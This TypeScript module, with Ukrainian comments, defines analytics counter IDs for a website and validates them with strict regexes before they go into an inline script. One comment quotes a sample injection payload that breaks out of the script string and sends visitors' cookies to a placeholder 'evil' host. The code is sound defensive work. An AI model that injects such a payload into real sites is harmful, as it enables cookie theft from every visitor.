// src/lib/analytics/ids.ts
// Типи й ключі лічильників. Чистий модуль без серверних залежностей —
// безпечно імпортувати і на сервері (резолвер у layout), і на клієнті (runtime).

export type AnalyticsIds = {
  gtm: string;
  ga: string;
  adsId: string;
  adsLabel: string;
  pixel: string;
};

/** Ключі, під якими лічильники зберігаються в site_settings. */
export const COUNTER_KEYS = {
  gtm: "gtm_id",
  ga: "ga_id",
  adsId: "google_ads_id",
  adsLabel: "google_ads_label",
  pixel: "meta_pixel_id",
} as const;

export const EMPTY_ANALYTICS_IDS: AnalyticsIds = {
  gtm: "",
  ga: "",
  adsId: "",
  adsLabel: "",
  pixel: "",
};

/**
 * Формати ID лічильників.
 *
 * ⚠️ НАВІЩО: ці значення підставляються в ТІЛО inline-<script> (AnalyticsProvider), тобто
 * потрапляють у код, а не в текст. Рядок на кшталт `X');fetch('https://evil/'+document.cookie;//`
 * виконався б у браузері КОЖНОГО відвідувача — тобто перманентний скімер, який пережив би
 * редеплої й не лишив сліду в git. Дірка post-compromise (писати в site_settings може лише
 * адмін), але саме такі й використовують після захоплення адмінки.
 *
 * Тому валідуємо ДВІЧІ: на записі (API адмінки) і на рендері (AnalyticsProvider) —
 * бо в БД уже могли лежати значення, записані до появи цієї перевірки.
 */
export const COUNTER_PATTERNS: Record<keyof AnalyticsIds, RegExp> = {
  gtm: /^GTM-[A-Z0-9]{4,12}$/,
  ga: /^G-[A-Z0-9]{4,15}$/,
  adsId: /^AW-\d{6,15}$/,
  // Мітка конверсії Google Ads — довільний токен без лапок/дужок/слешів.
  adsLabel: /^[A-Za-z0-9_-]{6,64}$/,
  pixel: /^\d{8,20}$/,
};

/** true — значення безпечне для підстановки в inline-скрипт. Порожнє = вимкнено, теж ок. */
export function isValidCounterId(kind: keyof AnalyticsIds, value: string): boolean {
  const v = value.trim();
  if (v === "") return true;
  return COUNTER_PATTERNS[kind].test(v);
}

/** Відкидає все, що не пройшло формат: краще без аналітики, ніж із чужим кодом на сайті. */
export function sanitizeAnalyticsIds(ids: AnalyticsIds): AnalyticsIds {
  const keys = Object.keys(COUNTER_PATTERNS) as (keyof AnalyticsIds)[];
  const out = { ...EMPTY_ANALYTICS_IDS };
  for (const k of keys) out[k] = isValidCounterId(k, ids[k]) ? ids[k].trim() : "";
  return out;
}
